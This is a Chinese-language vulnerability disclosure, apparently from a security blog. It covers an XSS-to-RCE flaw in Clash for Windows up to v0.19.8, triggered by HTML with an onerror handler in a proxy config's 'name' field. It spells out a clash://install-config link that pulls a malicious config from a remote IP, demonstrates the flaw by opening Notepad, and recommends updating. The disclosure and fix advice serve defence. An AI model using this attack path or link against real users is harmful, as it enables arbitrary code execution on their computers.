被誉为Windows上最好用的代理工具，今天 **Clash for windows**
的Github上显示了最新版本的更新，这就点燃了我强烈的好奇心，那就研究一波。

![1645849723_6219ac7be1497b293b06c.jpg!small?1645849725680](https://image.3001.net/images/20220226/1645849723_6219ac7be1497b293b06c.jpg!small?1645849725680)

![1645849356_6219ab0c48a37e950940c.png!small](https://image.3001.net/images/20220226/1645849356_6219ab0c48a37e950940c.png!small)

##  **I Clash For windows** **简介**

Clash 是一个使用 Go 语言编写，基于规则的跨平台代理软件核心程序。Clash for Windows 是目前在 Windows 上唯一可用的图形化
Clash 分支。通过 **Clash API 来配置** 和控制 Clash 核心程序，便于用户可视化操作和使用。Clash for Windows
免费客户端同时支持 Windows 和 Mac 平台，并且 **支持一键导入订阅配置文件.**

## II 漏洞分析

crash_for_windows_pkg 由 Electron 提供支持，经检测发现Clash for windows
代理规则配置文件中未设置严格的输入检测，攻击者可通过构造代理配置文件中的 XSS Payload 来执行任意 javascript 命令。
**"proxies"中的"name"字段嵌入html标签，"onerror"时触发语句执行。**

## III 漏洞详情

![1645873437_621a091d9279694424af2.png!small](https://image.3001.net/images/20220226/1645873437_621a091d9279694424af2.png!small)

测试版本

![1645849981_6219ad7d4fa51b647a017.png!small?1645849983066](https://image.3001.net/images/20220226/1645849981_6219ad7d4fa51b647a017.png!small?1645849983066)

构造代理配置文件中的 XSS Payload 来执行任意 javascript 命令 (clash config 文件)

![1645867816_6219f328bd6bf7ccef742.png!small?1645867819061](https://image.3001.net/images/20220226/1645867816_6219f328bd6bf7ccef742.png!small?1645867819061)

成功导入test.yaml

 **Note：另外一个利用方式： 也可以将恶意配置文件(test.yaml)放到互联网上并用 clash://安装**

clash://install-config?url=http%3A%2F%2F1.1.1.1%3A8888%2F1.txt&name=RCE

![1645873367_621a08d7e07b2c0c2723a.png!small?1645873370140](https://image.3001.net/images/20220226/1645873367_621a08d7e07b2c0c2723a.png!small?1645873370140)

切换到Proxies点击代理的配置即可触发RCE漏洞打开记事本

 **Note:经测试发现 <=V0.19.8的版本都受影响，操作系统:Windows10**

##  **IV 修复建议：**

更新到最新版本V0.19.10.

https://github.com/Fndroid/clash_for_windows_pkg/releases

![1645874561_621a0d81182a7f153086c.png!small?1645874563311](https://image.3001.net/images/20220226/1645874561_621a0d81182a7f153086c.png!small?1645874563311)

###  

  

